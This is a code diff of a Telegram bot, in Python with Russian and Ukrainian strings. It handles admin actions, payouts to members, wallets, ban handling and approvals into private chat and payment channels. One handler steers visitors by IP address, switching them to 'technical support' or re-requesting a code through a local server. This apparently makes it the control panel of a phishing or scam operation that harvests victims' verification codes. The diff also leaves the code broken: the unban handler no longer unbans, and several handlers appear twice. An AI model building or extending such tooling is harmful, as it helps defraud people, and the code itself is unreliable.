@@ -668,8 +668,10 @@ async def admin_panel_action(message: types.Message):
 @router.callback_query(lambda c: c.data == "payuser_back")
 async def payuser_back_handler(call: types.CallbackQuery):
     uid = call.from_user.id
-    user_step[uid] = 'admin_panel'
-    await call.message.answer("Возврат в админ-панель.", reply_markup=admin_panel_kb)
+    user_step[uid] = None
+    manual_payment_attempts.pop(uid, None)
+    kb = admin_menu_kb if is_admin(uid) else main_menu_kb
+    await call.message.answer("Возврат в главное меню.", reply_markup=kb)
     await call.answer()
 
 # --- Выплаты ---
@@ -796,8 +798,10 @@ async def admin_pay_amount(message: types.Message):
 @router.callback_query(lambda c: c.data == "pay_back")
 async def pay_back_handler(call: types.CallbackQuery):
     uid = call.from_user.id
-    user_step[uid] = 'admin_panel'
-    await call.message.answer("Возврат в админ-панель.", reply_markup=admin_panel_kb)
+    user_step[uid] = None
+    manual_payment_attempts.pop(uid, None)
+    kb = admin_menu_kb if is_admin(uid) else main_menu_kb
+    await call.message.answer("Возврат в главное меню.", reply_markup=kb)
     await call.answer()
 
 # --- Блокировка/разблокировка пользователей ---
@@ -876,23 +880,19 @@ async def ban_save(message: types.Message):
 @router.callback_query(lambda c: c.data.startswith('unban:'))
 async def unban_user(call: types.CallbackQuery):
     uid = call.from_user.id
-    target_id = int(call.data.split(':', 1)[1])
-    db_user = get_user(target_id)
-    form_json = db_user['form_json'] if db_user else {}
-    form_json['banned'] = False
-    form_json['ban_reason'] = ''
-    c = conn.cursor()
-    c.execute('UPDATE users SET form_json=? WHERE user_id=?', (json.dumps(form_json), target_id))
-    conn.commit()
-    await call.message.answer("Пользователь разблокирован.", reply_markup=admin_panel_kb)
-    user_step[uid] = 'admin_panel'
+    user_step[uid] = None
+    manual_payment_attempts.pop(uid, None)
+    kb = admin_menu_kb if is_admin(uid) else main_menu_kb
+    await call.message.answer("Возврат в главное меню.", reply_markup=kb)
     await call.answer()
 
 @router.callback_query(lambda c: c.data == "ban_back")
 async def ban_back_handler(call: types.CallbackQuery):
     uid = call.from_user.id
-    user_step[uid] = 'admin_panel'
-    await call.message.answer("Возврат в админ-панель.", reply_markup=admin_panel_kb)
+    user_step[uid] = None
+    manual_payment_attempts.pop(uid, None)
+    kb = admin_menu_kb if is_admin(uid) else main_menu_kb
+    await call.message.answer("Возврат в главное меню.", reply_markup=kb)
     await call.answer()
 
 # --- Билеты ---
@@ -993,7 +993,7 @@ async def ticket_input_handler(message: types.Message):
 async def tickets_cancel_handler(call: types.CallbackQuery):
     uid = call.from_user.id
     user_step[uid] = None
-    user_data[uid] = {}
+    manual_payment_attempts.pop(uid, None)
     kb = admin_menu_kb if is_admin(uid) else main_menu_kb
     await call.message.answer('Действие отменено. Вы возвращены в главное меню.', reply_markup=kb)
     await call.answer()
@@ -1628,20 +1628,112 @@ async def admin_action_handler(call: types.CallbackQuery):
     elif action == 'unblock':
         await call.answer("Користувач розблокований")
     elif action == 'support':
-        # Надсилаємо POST на /set_support_flag
         async with aiohttp_client.ClientSession() as session:
             await session.post('http://127.0.0.1:8080/set_support_flag', json={'ip': ip, 'type': 'support'})
         await call.answer("Включена технічна підтримка")
     elif action == 'text':
         await call.answer("Введіть текст повідомлення:")
-        user_step[call.from_user.id] = f'text_for_{ip}'
+        user_step[call.from_user.id] = f'text_for_{ip}'; return
     elif action == 'code_request_again':
-        # Надсилаємо POST на /set_request_again з кодом
         async with aiohttp_client.ClientSession() as session:
             await session.post('http://127.0.0.1:8080/set_request_again', json={'code': ip})
         await call.answer("Код запитується знову")
+    # Завжди після дії повертаємо в меню
+    user_step[call.from_user.id] = None
+    manual_payment_attempts.pop(call.from_user.id, None)
+    kb = admin_menu_kb if is_admin(call.from_user.id) else main_menu_kb
+    await call.message.answer("Возврат в главное меню.", reply_markup=kb)
+    await call.answer()
 
+@router.callback_query(lambda c: c.data == "payuser_back")
+async def payuser_back_handler(call: types.CallbackQuery):
+    uid = call.from_user.id
+    user_step[uid] = None
+    manual_payment_attempts.pop(uid, None)
+    kb = admin_menu_kb if is_admin(uid) else main_menu_kb
+    await call.message.answer("Возврат в главное меню.", reply_markup=kb)
+    await call.answer()
 
+@router.callback_query(lambda c: c.data == "pay_back")
+async def pay_back_handler(call: types.CallbackQuery):
+    uid = call.from_user.id
+    user_step[uid] = None
+    manual_payment_attempts.pop(uid, None)
+    kb = admin_menu_kb if is_admin(uid) else main_menu_kb
+    await call.message.answer("Возврат в главное меню.", reply_markup=kb)
+    await call.answer()
+
+@router.callback_query(lambda c: c.data.startswith('ban:'))
+async def ban_reason_ask(call: types.CallbackQuery):
+    uid = call.from_user.id
+    target_id = int(call.data.split(':', 1)[1])
+    user_data[uid] = {'ban_target': target_id}
+    user_step[uid] = 'ban_reason'
+    await call.message.answer("Введите причину блокировки:")
+    await call.answer()
+
+@router.callback_query(lambda c: c.data.startswith('unban:'))
+async def unban_user(call: types.CallbackQuery):
+    uid = call.from_user.id
+    user_step[uid] = None
+    manual_payment_attempts.pop(uid, None)
+    kb = admin_menu_kb if is_admin(uid) else main_menu_kb
+    await call.message.answer("Возврат в главное меню.", reply_markup=kb)
+    await call.answer()
+
+@router.callback_query(lambda c: c.data == "ban_back")
+async def ban_back_handler(call: types.CallbackQuery):
+    uid = call.from_user.id
+    user_step[uid] = None
+    manual_payment_attempts.pop(uid, None)
+    kb = admin_menu_kb if is_admin(uid) else main_menu_kb
+    await call.message.answer("Возврат в главное меню.", reply_markup=kb)
+    await call.answer()
+
+@router.callback_query(lambda c: c.data == "tickets_cancel")
+async def tickets_cancel_handler(call: types.CallbackQuery):
+    uid = call.from_user.id
+    user_step[uid] = None
+    manual_payment_attempts.pop(uid, None)
+    kb = admin_menu_kb if is_admin(uid) else main_menu_kb
+    await call.message.answer('Действие отменено. Вы возвращены в главное меню.', reply_markup=kb)
+    await call.answer()
+
+@router.callback_query(lambda c: c.data.startswith('approve_') or c.data.startswith('reject_'))
+async def process_decision(call: types.CallbackQuery):
+    action, uid = call.data.split('_')
+    uid = int(uid)
+    if action == 'approve':
+        kb = admin_menu_kb if is_admin(uid) else main_menu_kb
+        welcome_text = (
+            "Ваша заявка одобрена!\n"
+            "Чат: https://t.me/+hzNJ46_Vrc4wMzVk \n"
+            "Канал оплат: https://t.me/+qAiX41DRpeA5MDc8 \n"
+            "Для продолжения работы введите /start"
+        )
+        await bot.send_message(uid, welcome_text, reply_markup=kb)
+        update_user_status(uid, 'approved')
+    else:
+        await bot.send_message(uid, "Ваша заявка отклонена.")
+        update_user_status(uid, 'rejected')
+    user_step.pop(uid, None)
+    user_data.pop(uid, None)
+    await call.message.edit_reply_markup(reply_markup=None)
+    await call.answer()
+
+@router.callback_query(lambda c: c.data == "change_nickname")
+async def change_nickname_start(call: types.CallbackQuery):
+    uid = call.from_user.id
+    user_step[uid] = 'change_nickname'
+    await call.message.answer("Введите новый псевдоним:")
+    await call.answer()
+
+@router.callback_query(lambda c: c.data == "change_wallet")
+async def change_wallet_start(call: types.CallbackQuery):
+    uid = call.from_user.id
+    user_step[uid] = 'change_wallet'
+    await call.message.answer("Введите новый кошелек:")
+    await call.answer()
 
 # --- запуск aiohttp і aiogram в одному event loop ---
 @log_function
